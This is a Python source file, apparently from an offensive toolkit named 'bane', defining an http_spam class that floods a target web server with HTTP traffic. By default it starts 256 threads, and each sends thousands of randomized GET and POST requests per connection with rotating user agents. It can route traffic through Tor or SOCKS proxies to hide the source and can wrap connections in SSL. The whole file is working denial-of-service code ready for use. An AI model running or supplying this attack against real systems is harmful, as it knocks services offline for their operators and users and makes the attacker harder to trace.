from bane.ddos.utils import *

class http_spam(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        paths=["/"],
        threads=256,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        tor=False,
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        ssl_on=False,
        logs=True,
    ):
        self.ssl_on=ssl_on
        self.proxies=get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
        if self.proxies==[]:
            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.method = method
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    if self.tor==True:
                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                    else:
                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
                    if self.port==443 or self.ssl_on==True:
                        s=wrap_socket_with_ssl(s,self.target)
                    for l in range(random.randint(self.round_min, self.round_max)):
                        if self.method == 3:
                            ty = random.randint(1, 2)
                        else:
                            ty = self.method
                        if ty == 1:
                            req = "GET"
                        else:
                            req = "POST"
                        m = setup_http_packet(
                            self.target,
                            ty,
                            self.paths,
                            self.post_field_min,
                            self.post_field_max,
                            self.post_min,
                            self.post_max,
                            self.cookie,
                            self.user_agents,
                        )
                        try:
                            if self.stop == True:
                                break
                            s.send(m.encode("utf-8"))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    "\rRequest: {} | Type: {} | Bytes: {}   ".format(
                                        self.counter, req, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
                            time.sleep(self.interval)
                        except Exception as ex:
                            print(ex)
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass